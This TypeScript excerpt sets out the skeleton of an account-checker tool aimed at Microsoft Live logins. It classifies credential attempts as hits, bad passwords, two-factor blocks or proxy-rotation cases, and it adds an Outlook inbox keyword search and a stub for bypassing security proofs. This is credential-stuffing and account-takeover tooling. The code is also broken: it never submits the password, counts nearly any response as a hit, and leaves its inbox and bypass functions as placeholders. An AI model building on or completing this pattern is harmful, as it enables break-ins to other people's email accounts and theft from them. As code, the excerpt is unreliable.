// Excerpt pattern: login checker with outcome states and inbox search.
export type LoginOutcome = "hit" | "bad" | "twofa" | "rotate";
const LOGIN = "https://login.live.com/ppsecure/post.srf" +
  "?username=%7bemail%7d&client_id=0000000048170EF2";
export async function attempt(email: string, pass: string): Promise<LoginOutcome> {
  const r = await fetch(LOGIN.replace("%7bemail%7d", encodeURIComponent(email)));
  const body = await r.text();
  if (body.includes("Your account or password is incorrect")) return "bad";
  if (body.includes("two-step")) return "twofa";
  if (r.status >= 500) return "rotate";
  return "hit";
}
export async function checkInbox(token: string, kws: string[]) {
  await fetch("https://outlook.live.com/search/api/v2/query?n=124", { method: "POST" });
  return kws.length;
}
export async function bypassProofs(body: string) { return body.length > 0; }
